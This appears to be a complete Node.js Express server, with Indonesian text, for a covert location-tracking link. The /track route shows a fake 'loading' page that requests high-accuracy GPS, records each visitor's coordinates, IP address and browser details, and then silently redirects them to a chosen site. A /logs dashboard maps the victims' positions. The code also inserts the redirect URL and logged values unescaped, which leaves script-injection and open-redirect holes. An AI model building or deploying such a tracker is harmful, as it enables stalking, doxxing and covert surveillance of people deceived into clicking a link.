const express = require('express');
const app = express();

const visitLogs = [];

app.get('/track', (req, res) => {
    const targetUrl = req.query.target || 'https://www.google.com';
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Memuat...</title>
        </head>
        <body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; background:#111; color:#fff;">
            <p>Memuat halaman, mohon tunggu...</p>
            <script>
                if (navigator.geolocation) {
                    // Menggunakan enableHighAccuracy: true untuk meminta koordinat presisi
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            fetch('/save-loc?lat=' + pos.coords.latitude + '&lng=' + pos.coords.longitude + '&acc=' + pos.coords.accuracy + '&ip=${encodeURIComponent(clientIp)}&ua=${encodeURIComponent(userAgent)}')
                            .finally(() => {
                                window.location.href = '${targetUrl}';
                            });
                        },
                        (err) => {
                            // Jika izin ditolak atau gagal, tetap alihkan ke URL tujuan
                            window.location.href = '${targetUrl}';
                        },
                        {
                            enableHighAccuracy: true, // Meminta sinyal GPS presisi tinggi
                            timeout: 10000,           // Waktu tunggu maksimum 10 detik
                            maximumAge: 0             // Mengabaikan lokasi cache lama
                        }
                    );
                } else {
                    window.location.href = '${targetUrl}';
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/save-loc', (req, res) => {
    const { lat, lng, acc, ip, ua } = req.query;
    visitLogs.unshift({
        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
        ip: ip,
        lat: lat,
        lng: lng,
        akurasi: acc ? acc + ' meter' : 'Tidak diketahui',
        ua: ua
    });
    res.sendStatus(200);
});

app.get('/logs', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Dashboard Log Lokasi</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-slate-900 text-slate-100 min-h-screen p-6 font-sans">
            <div class="max-w-4xl mx-auto space-y-4">
                <h1 class="text-xl font-bold border-b border-slate-800 pb-2">Dashboard Log Lokasi GPS</h1>
                <div class="space-y-3">
                    ${visitLogs.length === 0 ? '<p class="text-slate-500">Belum ada lokasi terekam.</p>' : visitLogs.map(log => `
                        <div class="bg-slate-800 border border-slate-700 p-4 rounded-xl space-y-2 text-xs">
                            <p class="text-emerald-400 font-mono"><b>Waktu:</b> ${log.waktu}</p>
                            <p><b>Akurasi Sinyal:</b> ${log.akurasi}</p>
                            <p><b>Koordinat:</b> <a href="https://maps.google.com/?q=${log.lat},${log.lng}" target="_blank" class="text-blue-400 underline font-mono">${log.lat}, ${log.lng} (Buka di Google Maps)</a></p>
                            <p class="text-slate-400"><b>IP:</b> ${log.ip}</p>
                        </div>
                    `).join('')}
                </div>
            </div>
        </body>
        </html>
    `);
});

app.get('/', (req, res) => {
    res.send('Server Tracker Aktif.');
});

module.exports = app;
